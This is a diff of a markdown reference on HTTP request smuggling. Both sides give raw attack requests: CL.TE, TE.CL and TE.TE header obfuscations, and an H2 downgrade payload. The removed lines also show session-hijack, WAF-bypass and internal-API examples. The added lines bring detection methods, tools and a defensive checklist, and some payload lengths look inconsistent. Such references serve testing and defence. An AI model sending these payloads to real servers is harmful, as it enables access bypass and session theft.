@@ -1,12 +1,9 @@
-# HTTP Request Smuggling: Complete Reference
+# HTTP Request Smuggling: 2026 Complete Reference
 
-## Detection
+## Attack Classes
 
 ### CL.TE (Content-Length vs Transfer-Encoding)
-```bash
-# Victim sees Content-Length, backend sees Transfer-Encoding
-# Frontend reads CL=13, Backend reads TE, treats next request as smuggled
-
+```
 POST / HTTP/1.1
 Host: target.com
 Content-Length: 13
@@ -14,91 +11,89 @@ Transfer-Encoding: chunked
 
 0
 
-SMUGGLED
-```
-
-### TE.CL (Transfer-Encoding vs Content-Length)
-```bash
-# Frontend sees TE, backend sees CL
-# Frontend treats next chars as part of same request
-
-POST / HTTP/1.1
-Host: target.com
-Transfer-Encoding: chunked
-Content-Length: 4
-
-58
-GPOST / HTTP/1.1
-...
-
-0
-```
-
-### TE.TE (Transfer-Encoding obfuscation)
-```bash
-# Both frontend and backend support TE, but parse differently
-Transfer-Encoding: xchunked
-Transfer-Encoding : chunked
-Transfer-Encoding: chunked\x0b
-Transfer-Encoding: chunked\x0c
-Transfer-Encoding: chunked\x20
-Transfer-Encoding: chunked\x00
-Transfer-Encoding: chunked,
-Transfer-Encoding: chunked, identity
-```
-
-## Exploitation
-
-### User Impersonation
-```bash
-# Smuggle a request that hijacks another user's session
-
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 62
-Transfer-Encoding: chunked
-
-0
-
-GET / HTTP/1.1
-Host: target.com
-Cookie: session=admin_session
-```
-
-### WAF Bypass
-```bash
-# Inject request directly to backend, bypassing WAF checks
-
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 29
-Transfer-Encoding: chunked
-
-0
-
 GET /admin HTTP/1.1
-X-Ignore: X
 ```
+Front-end uses Content-Length, back-end uses Transfer-Encoding. Second request smuggled.
 
-### Internal Endpoint Access
-```bash
-# Access internal APIs exposed only to the backend
-
-POST /public HTTP/1.1
+### TE.CL
+```
+POST / HTTP/1.1
 Host: target.com
-Content-Length: 55
+Content-Length: 4
 Transfer-Encoding: chunked
 
+5c
+POST /404 HTTP/1.1
+Content-Length: 15
+
+x=1
 0
 
-GET /internal/admin/api/users HTTP/1.1
-Host: internal-admin
+```
+Front-end uses Transfer-Encoding, back-end uses Content-Length. First request body truncated.
+
+### TE.TE (Obfuscated TE)
+```http
+Transfer-Encoding: chunked
+Transfer-encoding: xchunked
+Transfer-Encoding:[tab]chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding : chunked
+Transfer-Encoding:
+chunked
 ```
 
-## CVSS Scoring
-| Scenario | CVSS | Criteria |
-|----------|------|---------|
-| Request smuggling -> WAF bypass | 8.6 | Network, Low, No auth, Changed scope |
-| Request smuggling -> session hijack | 7.5 | Network, Low, No auth, Changed scope |
-| Request smuggling -> cache poisoning | 6.1 | Network, Low, Network attack vector |
-| Request smuggling -> internal access | 9.1 | Network, Low, No auth, Changed scope |
+## HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)
+
+HTTP/2 uses binary framing (no headers for length). When reverse proxy downgrades H2 to H1 for backend:
+```
+:method POST
+:path /
+:authority target.com
+content-type application/x-www-form-urlencoded
+content-length 0
+
+POST /admin HTTP/1.1
+Host: target.com
+Content-Length: 10
+
+x=1
+```
+Front-end processes as single H2 stream. Back-end receives H1 with two requests (smuggled).
+
+## HTTP/3 Desync
+
+### QPACK Encoding Confusion
+- H3 uses QPACK for header compression
+- QPACK dynamic table desynchronization when upstream and downstream disagree on table state
+- Smuggled headers when table insertion count mismatches
+- Reported by James Kettle (PortSwigger) in 2024-2025 research
+
+## Detection
+
+### Timing-Based
+- Send smuggling payload → subsequent request returns 404 or 400
+- 404 = smuggled prefix consumed your real request
+- Timing can indicate smuggling vs normal processing
+
+### Response-Based
+- Smuggled request content appears in next response
+- Different status codes on identical follow-up requests
+- Multiple responses from single request
+
+## Tooling
+- **HTTP Request Smuggler** (Burp extension, PortSwigger): Automated scanning for all types
+- **Smuggler**: CL.TE/TE.CL detection
+- **h2smuggler**: HTTP/2 downgrade detection
+- **smuggler.py** (defparam): CL.TE/TE.CL/TE.TE detection
+
+## Defensive Checklist
+1. Use HTTP/2 end-to-end (no H2→H1 downgrade)
+2. Reject ambiguous requests: reject Transfer-Encoding when Content-Length present
+3. Normalize Transfer-Encoding to single value
+4. Rewrite protocol: normalize malformed headers upstream
+5. Use precise Content-Length from actual body
+6. Close connection on ambiguous requests
+7. Upgrade to newest reverse proxy versions (nginx, haproxy, envoy)
+8. For H3: ensure QPACK decoder state is synchronized across front-end and back-end
